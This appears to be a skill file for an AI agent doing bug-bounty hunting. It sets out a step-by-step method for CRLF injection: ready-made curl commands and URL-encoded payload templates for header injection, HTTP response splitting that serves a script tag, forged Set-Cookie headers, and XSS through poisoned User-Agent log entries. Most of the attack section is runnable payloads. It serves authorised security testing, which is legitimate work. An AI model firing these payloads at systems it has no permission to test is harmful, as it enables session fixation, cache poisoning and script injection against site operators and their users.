---
name: hunt-crlf
description: Hunt CRLF Injection — header injection, response splitting, HTTP request smuggling via CRLF, cookie injection, XSS via log poisoning. High when chained to cache poisoning or XSS. Use when testing any endpoint reflecting user input in response headers.
sources: hackerone_public
---

# HUNT-CRLF — CRLF / Log Injection

## Crown Jewel Targets

CRLF alone is Medium. Chained to cache poisoning, XSS, or log poisoning it becomes High.

- **Redirect endpoints** — `?url=`, `?next=`, `?redirect_uri=`
- **Logging endpoints** — user-agent, referer, X-Forwarded-For reflected in admin logs
- **Proxy/cache fronted endpoints** — CRLF → cache poisoning → stored XSS
- **Cookie-setting endpoints** — inject `Set-Cookie` header via CRLF
- **Error log viewers** — admin SOC dashboard renders logs as HTML

## Attack Surface Signals

```
User input reflected in any response header
Redirect parameters: ?url=, ?next=, ?redirect=
Logging: User-Agent, Referer, X-Forwarded-For
```

## Step-by-Step Hunting Methodology

### Phase 1 — Detect CRLF

```bash
# URL-encoded CRLF test
curl -s -I "https://target.com/redirect?url=%0d%0aX-Injected:%20true"

# Check response for X-Injected header
curl -s -D - "https://target.com/redirect?url=%0d%0aX-Injected:%20true%0d%0a"
```

### Phase 2 — Response Splitting

```bash
# Split response to serve attacker content
curl -s "https://target.com/redirect?url=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2023%0d%0a%0d%0a<script>alert(1)</script>"
```

### Phase 3 — Cookie Injection

```bash
# Inject Set-Cookie header
curl -s -I "https://target.com/?param=%0d%0aSet-Cookie:%20session=attacker;%20path=/"
```

### Phase 4 — Log Poisoning → XSS

```bash
# Inject XSS payload into log via User-Agent
curl -s "https://target.com/" -A "Mozilla/5.0<script>alert(1)</script>"
# Then if admin views logs in browser without sanitization → stored XSS
```

## Payload Templates

```
# Basic header injection
%0d%0aX-Injected:%20true

# Response splitting
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a

# Cookie injection
%0d%0aSet-Cookie:%20session=attacker;%20path=/

# Double CRLF to end headers
%0d%0a%0d%0a<script>alert(1)</script>
```

## Common Root Causes

- User input concatenated into response headers without sanitization
- Redirect parameters not validated or encoded
- Log data rendered in browsers without HTML encoding
- Reverse proxies pass through CRLF sequences

## Gate 0 Validation

- [ ] Have I confirmed CRLF injection in a response header?
- [ ] Have I tested response splitting?
- [ ] Have I tested cookie injection?
- [ ] Have I tested log poisoning if logs are browser-rendered?
